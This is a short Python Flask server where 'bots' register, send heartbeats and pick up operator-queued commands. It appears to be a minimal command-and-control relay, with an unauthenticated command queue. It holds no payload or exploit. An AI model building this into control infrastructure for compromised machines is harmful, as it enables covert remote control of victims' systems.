
import flask
import threading
import time

app = flask.Flask(__name__)

bots = {}
commands = {}

@app.route('/register', methods=['POST'])
def register():
    bot_id = flask.request.json.get('bot_id')
    bots[bot_id] = {
        'last_seen': time.time(),
        'status': 'idle'
    }
    return flask.jsonify({'status': 'registered'})

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    bot_id = flask.request.json.get('bot_id')
    if bot_id in bots:
        bots[bot_id]['last_seen'] = time.time()
        if bot_id in commands:
            command = commands.pop(bot_id)
            return flask.jsonify(command)
    return flask.jsonify({'status': 'ok'})

@app.route('/bots', methods=['GET'])
def get_bots():
    return flask.jsonify(bots)

@app.route('/command', methods=['POST'])
def command():
    bot_id = flask.request.json.get('bot_id')
    command = flask.request.json.get('command')
    commands[bot_id] = command
    return flask.jsonify({'status': 'command queued'})

def cleanup_bots():
    while True:
        now = time.time()
        for bot_id, bot_info in list(bots.items()):
            if now - bot_info['last_seen'] > 60:
                del bots[bot_id]
        time.sleep(30)

if __name__ == '__main__':
    cleanup_thread = threading.Thread(target=cleanup_bots)
    cleanup_thread.daemon = True
    cleanup_thread.start()
    app.run(host='0.0.0.0', port=5000)
